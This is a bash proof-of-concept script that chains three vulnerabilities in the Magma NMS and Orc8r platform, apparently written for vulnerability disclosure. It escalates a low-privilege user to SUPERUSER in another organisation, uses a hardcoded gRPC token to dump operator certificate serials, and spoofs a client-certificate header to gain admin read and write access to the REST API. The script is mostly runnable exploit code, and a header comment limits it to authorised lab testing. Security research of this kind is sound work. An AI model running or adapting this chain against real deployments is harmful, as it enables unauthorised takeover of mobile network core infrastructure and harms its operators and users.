#!/bin/bash
# =============================================================================
# MAGMA-2026-005 - Full chain proof of concept
# =============================================================================
# Chain:
#   1. MAGMA-2026-001  Host Routes RBAC Bypass
#                      role=0 host-org user -> SUPERUSER in the target org
#   2. MAGMA-2026-003  Hardcoded gRPC client-cert token
#                      dump Orc8r operator certificate serials
#   3. MAGMA-2026-004  Certificate spoofing via HTTP header
#                      use the admin_operator serial on the Orc8r REST API
#
# AUTHORIZED TESTING ONLY. Use a disposable lab. Step 3 creates a network as
# evidence; delete it afterwards if the lab is shared.
# =============================================================================

# -----------------------------------------------------------------------------
# CONFIGURATION - change these for your target
# -----------------------------------------------------------------------------
NMS_URL="${NMS_URL:-http://localhost:8081}"
HOST_HOST="${HOST_HOST:-host.localhost:8081}"        # Host header of the host org
TARGET_HOST="${TARGET_HOST:-testorg.localhost:8081}" # Host header of the target org
TARGET_ORG="${TARGET_ORG:-testorg}"                   # target organization (must exist)
USER_EMAIL="${USER_EMAIL:-normal@test.com}"           # existing role=0 user in the HOST org
USER_PASS="${USER_PASS:-password12345}"

ORC8R_URL="${ORC8R_URL:-http://localhost:9081}"      # Obsidian REST API (non-TLS)
GRPC_HOST="${GRPC_HOST:-controller}"                 # internal gRPC host
GRPC_PORT="${GRPC_PORT:-9186}"                       # certifier
ACCESSD_PORT="${ACCESSD_PORT:-9191}"                 # accessd

GRPC_TOKEN="${GRPC_TOKEN:-7ZZXAF7CAETF241KL22B8YRR7B5UF401}"

# Proto sources
MAGMA_SRC="${MAGMA_SRC:-$HOME/cve_research/magma/magma}"
PROTO_DIR="${PROTO_DIR:-/tmp/magma_protos}"
PROTOC_INCLUDE="${PROTOC_INCLUDE:-/usr/include}"

# Optional: run grpcurl inside an attacker container that shares the network.
# Leave empty to use a local grpcurl binary.
ATTACKER_CONTAINER="${ATTACKER_CONTAINER:-}"  # e.g. "lab-tls-disabled-attacker-1"

# Expected serial can be supplied to skip phase 2 (for testing phase 3 alone)
ADMIN_SERIAL="${ADMIN_SERIAL:-}"

# -----------------------------------------------------------------------------
# No configuration below this line
# -----------------------------------------------------------------------------
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; NC='\033[0m'
ok()   { echo -e "${GREEN}[+]${NC} $1"; }
info() { echo -e "${YELLOW}[*]${NC} $1"; }
err()  { echo -e "${RED}[-]${NC} $1"; }

JAR=/tmp/magma_chain_jar.txt
rm -f "$JAR"

echo "=============================================================="
echo " MAGMA-2026-005 - RBAC -> gRPC token -> cert header spoofing"
echo " Chain CVSS 3.1: 9.9 CRITICAL | CVSS 4.0: 9.4 CRITICAL"
echo "=============================================================="

# =============================================================================
# PHASE 1 - MAGMA-2026-001: role=0 -> SUPERUSER
# =============================================================================
info "Phase 1: login as $USER_EMAIL (role=0)"

CSRF=$(curl -sf -c "$JAR" -H "Host: $HOST_HOST" "$NMS_URL/user/login" \
        | grep -oP '"csrfToken":"\K[^"]+')
[ -z "$CSRF" ] && { err "NMS not reachable at $NMS_URL"; exit 1; }

curl -sf -L -c "$JAR" -b "$JAR" -X POST "$NMS_URL/user/login" \
  -H "Content-Type: application/x-www-form-urlencoded" -H "Host: $HOST_HOST" \
  -H "X-CSRF-Token: $CSRF" \
  --data-urlencode "email=$USER_EMAIL" \
  --data-urlencode "password=$USER_PASS" -o /dev/null
ok "Logged in as $USER_EMAIL"

CSRF2=$(curl -sf -b "$JAR" -H "Host: $HOST_HOST" "$NMS_URL/nms/" \
         | grep -oP '"csrfToken":"\K[^"]+' | head -1)
[ -z "$CSRF2" ] && { err "Could not obtain a CSRF token from /nms/"; exit 1; }

ESC_EMAIL="chain-$(date +%s)@test.com"
ESC_PASS="$(openssl rand -base64 12 | tr '+/' 'xX')!"
RESP=$(curl -s -b "$JAR" -X POST \
  "$NMS_URL/host/organization/async/$TARGET_ORG/add_user" \
  -H "Content-Type: application/json" -H "Host: $HOST_HOST" \
  -H "X-CSRF-Token: $CSRF2" \
  -d "{\"email\":\"$ESC_EMAIL\",\"password\":\"$ESC_PASS\",\"role\":3,\"networkIDs\":[\"*\"]}" \
  -w '\n%{http_code}' 2>/dev/null)
HTTP_CODE=$(echo "$RESP" | tail -1)
BODY=$(echo "$RESP" | sed '$d')

ROLE=$(echo "$BODY" | python3 -c \
  "import json,sys; print(json.load(sys.stdin).get('user',{}).get('role','FAIL'))" \
  2>/dev/null)
if [ "$ROLE" != "3" ]; then
  err "Phase 1 failed (HTTP $HTTP_CODE): $BODY"
  exit 1
fi
ok "SUPERUSER created: $ESC_EMAIL / $ESC_PASS"

# =============================================================================
# PHASE 2 - MAGMA-2026-003: hardcoded gRPC token
# =============================================================================
info "Phase 2: certifier.GetAll with the hardcoded client-cert token"

if [ -n "$ATTACKER_CONTAINER" ]; then
  if ! docker exec "$ATTACKER_CONTAINER" sh -c 'command -v grpcurl >/dev/null 2>&1'; then
    if command -v grpcurl >/dev/null 2>&1; then
      info "grpcurl not present in $ATTACKER_CONTAINER; copying local binary"
      docker cp "$(command -v grpcurl)" "$ATTACKER_CONTAINER:/usr/local/bin/grpcurl"
      docker exec "$ATTACKER_CONTAINER" chmod +x /usr/local/bin/grpcurl
    else
      err "grpcurl not found locally or in the attacker container"
      exit 1
    fi
  fi
  GRPC=(docker exec "$ATTACKER_CONTAINER" grpcurl)
  IMPORT_DIR=/tmp/magma_protos
else
  command -v grpcurl >/dev/null 2>&1 || { err "grpcurl not installed"; exit 1; }
  GRPC=(grpcurl)
  IMPORT_DIR="$PROTO_DIR"
fi

# Prepare proto tree (idempotent)
if [ ! -f "$PROTO_DIR/orc8r/protos/certifier_svc.proto" ]; then
  mkdir -p "$PROTO_DIR/orc8r/protos" "$PROTO_DIR/google/protobuf"
  cp "$MAGMA_SRC/orc8r/protos/identity.proto"  "$PROTO_DIR/orc8r/protos/" 2>/dev/null
  cp "$MAGMA_SRC/orc8r/protos/common.proto"    "$PROTO_DIR/orc8r/protos/" 2>/dev/null
  cp "$MAGMA_SRC/orc8r/protos/certifier.proto" "$PROTO_DIR/orc8r/protos/" 2>/dev/null
  cp "$MAGMA_SRC/orc8r/cloud/go/services/certifier/protos/certifier.proto" \
     "$PROTO_DIR/orc8r/protos/certifier_svc.proto" 2>/dev/null
  cp "$MAGMA_SRC/orc8r/cloud/go/services/accessd/protos/access.proto" \
     "$PROTO_DIR/orc8r/protos/" 2>/dev/null
  cp "$PROTOC_INCLUDE/google/protobuf/timestamp.proto" "$PROTO_DIR/google/protobuf/" 2>/dev/null
  cp "$PROTOC_INCLUDE/google/protobuf/duration.proto"  "$PROTO_DIR/google/protobuf/" 2>/dev/null
fi

if [ -n "$ATTACKER_CONTAINER" ]; then
  docker cp "$PROTO_DIR" "$ATTACKER_CONTAINER:/tmp/magma_protos" >/dev/null 2>&1
fi

if [ -z "$ADMIN_SERIAL" ]; then
  CERT_DUMP=$("${GRPC[@]}" -plaintext -import-path "$IMPORT_DIR" \
    -proto "$IMPORT_DIR/orc8r/protos/certifier_svc.proto" \
    -rpc-header "x-magma-client-cert-serial: $GRPC_TOKEN" -d '' \
    "$GRPC_HOST:$GRPC_PORT" magma.orc8r.certifier.Certifier/GetAll 2>/dev/null)

  if [ -z "$CERT_DUMP" ]; then
    err "gRPC call failed. Is $GRPC_HOST:$GRPC_PORT reachable from this host?"
    err "If not, set ATTACKER_CONTAINER to a container on the Orc8r network."
    exit 1
  fi
  ok "Hardcoded token accepted by certifier"

  ADMIN_SERIAL=$(echo "$CERT_DUMP" | python3 -c '
import json,sys
d=json.load(sys.stdin)
for sn,v in d.get("certificates",{}).items():
    if v.get("id",{}).get("operator") == "admin_operator":
        print(sn); break
' 2>/dev/null)
fi

if [ -z "$ADMIN_SERIAL" ]; then
  err "Could not extract an admin_operator serial from the certifier response"
  exit 1
fi
ok "admin_operator serial: $ADMIN_SERIAL"

ACL_DUMP=$("${GRPC[@]}" -plaintext -import-path "$IMPORT_DIR" \
  -proto "$IMPORT_DIR/orc8r/protos/access.proto" \
  -rpc-header "x-magma-client-cert-serial: $GRPC_TOKEN" -d '' \
  "$GRPC_HOST:$ACCESSD_PORT" \
  magma.orc8r.accessd.AccessControlManager/ListOperators 2>/dev/null)
if [ -n "$ACL_DUMP" ]; then
  ok "accessd.ListOperators succeeded with the same token"
else
  info "accessd.ListOperators returned no data (port/proto may differ)"
fi

# =============================================================================
# PHASE 3 - MAGMA-2026-004: certificate header spoofing
# =============================================================================
info "Phase 3: use the admin_operator serial on the Obsidian REST API"

NETWORKS=$(curl -sf -H "X-Magma-Client-Cert-Serial: $ADMIN_SERIAL" \
  "$ORC8R_URL/magma/v1/networks" 2>/dev/null)
if [ -z "$NETWORKS" ]; then
  err "Obsidian rejected the serial, or is unreachable at $ORC8R_URL"
  exit 1
fi
ok "REST API accepted the header as admin_operator"
ok "Networks: $NETWORKS"

NET_ID="poc-$(date +%s)"
HTTP=$(curl -s -o /tmp/magma_chain_net.json -w '%{http_code}' \
  -H "X-Magma-Client-Cert-Serial: $ADMIN_SERIAL" \
  -H "Content-Type: application/json" \
  -X POST "$ORC8R_URL/magma/v1/networks" \
  -d "{\"id\":\"$NET_ID\",\"name\":\"PoC Network\",\"description\":\"created via certificate header spoofing\",\"dns\":{\"enable_caching\":false,\"local_ttl\":0}}" \
  2>/dev/null)

if [ "$HTTP" = "200" ] || [ "$HTTP" = "201" ]; then
  ok "Write access confirmed: created network $NET_ID (HTTP $HTTP)"
  ok "Verify: curl -H 'X-Magma-Client-Cert-Serial: $ADMIN_SERIAL' $ORC8R_URL/magma/v1/networks/$NET_ID"
else
  err "Network creation returned HTTP $HTTP"
  info "Response: $(cat /tmp/magma_chain_net.json 2>/dev/null)"
fi

echo ""
echo "=============================================================="
echo " CHAIN COMPLETE"
echo "   $USER_EMAIL (role=0) -> $ESC_EMAIL (role=3)"
echo "   token -> admin_operator serial $ADMIN_SERIAL"
echo "   header -> full Orc8r REST API access"
echo "   evidence network: $NET_ID"
echo "=============================================================="

rm -f "$JAR" /tmp/magma_chain_net.json
